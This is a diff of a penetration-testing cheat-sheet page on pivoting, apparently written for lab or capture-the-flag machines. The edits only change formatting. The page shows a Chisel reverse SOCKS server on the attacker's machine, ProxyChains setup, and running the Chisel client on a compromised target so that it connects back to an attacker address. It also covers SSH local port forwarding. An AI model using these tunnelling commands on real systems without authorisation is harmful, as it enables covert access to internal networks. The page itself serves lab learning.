@@ -2,14 +2,14 @@
 description: chisel, proxychains & ssh
 ---
 
-# Proxying \ PortForwarding
+# Proxying \ Port Forwarding
 
 ## Contents:
 
 * [Chisel](proxying-portforwarding.md#chisel-and-proxychains-tunneling-and-pivoting)
 * [SSH Local Port Forwarding](proxying-portforwarding.md#ssh-local-port-forwarding)
 
-## 🔀 Chisel & ProxyChains: Tunneling & Pivoting
+## Chisel & ProxyChains: Tunneling & Pivoting
 
 Techniques: [https://attack.mitre.org/techniques/T1090/](https://attack.mitre.org/techniques/T1090/)
 
@@ -17,7 +17,7 @@ When working on **internal network enumeration** or **pivoting**, **Chisel** com
 
 ***
 
-#### **1️⃣ Attacker: Start Chisel Server**
+#### **1. Attacker: Start Chisel Server**
 
 On your **attacking machine (Kali, Parrot, etc.)**, start a **Chisel server** that listens for reverse connections:
 
@@ -25,11 +25,11 @@ On your **attacking machine (Kali, Parrot, etc.)**, start a **Chisel server** th
 chisel server --reverse -p 9001 --socks5 -v
 ```
 
-#### **📝 Explanation**
+#### **Explanation**
 
 <table><thead><tr><th>Command</th><th>Description</th><th data-hidden></th></tr></thead><tbody><tr><td><code>--reverse</code></td><td>Allows reverse tunneling (victim connects back to attacker)</td><td></td></tr><tr><td><code>-p 9001</code></td><td>Runs the Chisel server on <strong>port 9001</strong></td><td></td></tr><tr><td><code>--socks5</code></td><td>Enables a <strong>SOCKS5 proxy</strong></td><td></td></tr><tr><td><code>-v</code></td><td><strong>Verbose mode</strong> for debugging</td><td></td></tr></tbody></table>
 
-#### **2️⃣ Configuring ProxyChains**
+#### **2. Configuring ProxyChains**
 
 To tunnel traffic through the compromised host, edit **ProxyChains configuration** on the attacker’s machine:
 
@@ -47,7 +47,7 @@ socks5 127.0.0.1 1080
 
 `127.0.0.1 1080` → **SOCKS5 proxy is running locally on port 1080**
 
-#### **3️⃣ Victim: Connect Back to Attacker**
+#### **3. Victim: Connect Back to Attacker**
 
 On the **compromised target**, download and execute Chisel:
 
@@ -56,12 +56,12 @@ chmod +x chisel
 ./chisel client 10.10.14.21:9001 R:socks
 ```
 
-#### **📝 Explanation**
+#### **Explanation**
 
 * Connects **back to the attacker’s Chisel server (10.10.14.21:9001)**
 * `R:socks` → Creates a **SOCKS proxy tunnel**
 
-#### **4️⃣ Using ProxyChains for Access**
+#### **4. Using ProxyChains for Access**
 
 Once the tunnel is established, **route your tools through the compromised host** using ProxyChains.
 
@@ -71,15 +71,15 @@ Once the tunnel is established, **route your tools through the compromised host*
 proxychains firefox 127.0.0.1:8080
 ```
 
-## 🔀 SSH Local Port Forwarding
+## SSH Local Port Forwarding
 
-#### 📌 Command
+#### Command
 
 ```bash
 ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> <USER>@<TARGET_IP>
 ```
 
-#### 📖 Explanation
+#### Explanation
 
 This **SSH Local Port Forwarding** command allows access to **a remote service** by tunneling it through a **local port**.
 
@@ -90,14 +90,14 @@ This **SSH Local Port Forwarding** command allows access to **a remote service**
 | `127.0.0.1:<REMOTE_PORT>`                 | The **service running on the remote machine** that you want to reach |
 | `<USER>@<TARGET_IP>`                      | The **SSH credentials** for accessing the remote system              |
 
-#### ✔️ **Make the tunnel persistent using `-N` (no shell) and `-f` (background mode):**
+#### ✔**Make the tunnel persistent using `-N` (no shell) and `-f` (background mode):**
 
 ```
 ssh -L 8080:127.0.0.1:80 -N -f user@target.htb
 ```
 
-#### 🎯 **How It Works**
+#### **How It Works**
 
-1️⃣ **Creates an SSH connection** to the target machine.\
-2️⃣ **Maps a local port** (`<LOCAL_PORT>`) to a **remote service** (`<REMOTE_PORT>`).\
-3️⃣ **Access the remote service** by connecting to `127.0.0.1:<LOCAL_PORT>` on your machine.
+1. **Creates an SSH connection** to the target machine
+2. &#x20;**Maps a local port** (`<LOCAL_PORT>`) to a **remote service** (`<REMOTE_PORT>`)
+3. **Access the remote service** by connecting to `127.0.0.1:<LOCAL_PORT>` on your machine
